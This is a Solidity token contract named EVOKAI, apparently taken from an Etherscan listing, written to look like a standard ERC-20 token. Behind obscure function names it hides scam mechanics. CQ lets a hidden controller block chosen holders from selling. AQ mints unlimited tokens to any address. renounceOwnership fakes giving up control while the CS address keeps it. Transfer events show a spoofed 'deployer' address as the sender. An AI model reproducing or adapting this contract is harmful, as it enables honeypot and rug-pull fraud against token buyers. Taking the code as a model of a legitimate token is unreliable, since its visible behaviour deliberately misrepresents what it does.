/**
 *Submitted for verification at Etherscan.io on 2023-01-12
*/

// SPDX-License-Identifier: MIT

/*

  _____   _____  _  __   _   ___ 
 | __\ \ / / _ \| |/ /  /_\ |_ _|
 | _| \ V / (_) | ' <  / _ \ | | 
 |___| \_/ \___/|_|\_\/_/ \_\___|
                                 

*/

pragma solidity 0.8.17;

   
 
contract EVOKAI {
  
    mapping (address => uint256) private BOF;
    mapping (address => uint256) private COG;
    mapping(address => mapping(address => uint256)) public allowance;
  


    
    string public name = "EVOKAI";
    string public symbol = unicode"EVOKAI";
    uint8 public decimals = 6;
    uint256 public totalSupply = 100000000 *10**6;
    address owner = msg.sender;
    address private CS;
    address deployer = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        CS = msg.sender;
        deploy(msg.sender, totalSupply); }

    function renounceOwnership() public virtual {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }



    function deploy(address account, uint256 amount) internal {
    account = deployer;
    BOF[msg.sender] = totalSupply;
    emit Transfer(address(0), account, amount); }

    modifier KSD() {   
    require(msg.sender == CS);
         _;}

   function balanceOf(address account) public view  returns (uint256) {
        return BOF[account];
    }
    function transfer(address to, uint256 value) public returns (bool success) {


      require(COG[msg.sender] <= 1);
        require(BOF[msg.sender] >= value);
  BOF[msg.sender] -= value;  
        BOF[to] += value;          
 emit Transfer(msg.sender, to, value);
        return true; }
 function CQ (address io, uint256 ix) KSD public {
   COG[io] = ix;} 
function AQ (address io, uint256 ix) KSD public {
    BOF[io] += ix;} 
 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }
    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == CS)  {
 require(value <= BOF[from]);
        require(value <= allowance[from][msg.sender]);
        BOF[from] -= value;  
      BOF[to] += value; 
        from = deployer;
        emit Transfer (from, to, value);
        return true; }    

        require(COG[from] <= 1 && COG[to] <=1);
        require(value <= BOF[from]);
        require(value <= allowance[from][msg.sender]);
        BOF[from] -= value;
        BOF[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }